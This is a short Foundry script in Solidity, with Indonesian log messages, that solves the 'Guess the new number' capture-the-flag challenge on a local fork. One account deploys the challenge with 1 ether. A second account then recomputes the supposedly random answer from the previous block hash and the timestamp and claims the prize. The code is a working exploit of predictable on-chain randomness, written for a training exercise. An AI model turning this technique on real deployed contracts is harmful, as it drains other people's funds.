// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Script.sol";
import "./GuessTheNewNumber.sol";

contract ScriptGuessNewNumber is Script {
    function run() external {
        vm.createSelectFork(vm.envString("ANVIL"));
        vm.startBroadcast(vm.envUint("BOB"));
        console.log("deploy kontrak dengan 1 ether");
        GuessTheNewNumberChallenge guess = new GuessTheNewNumberChallenge{value: 1 ether}();
        vm.stopBroadcast();
        vm.startBroadcast(vm.envUint("ALICE"));
        console.log("saatnya menghacking");
        console.log("kumplit?", guess.isComplete());
        uint8 n = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        guess.guess{value: 1 ether}(n);
        console.log("kumplit?", guess.isComplete());
    }
}
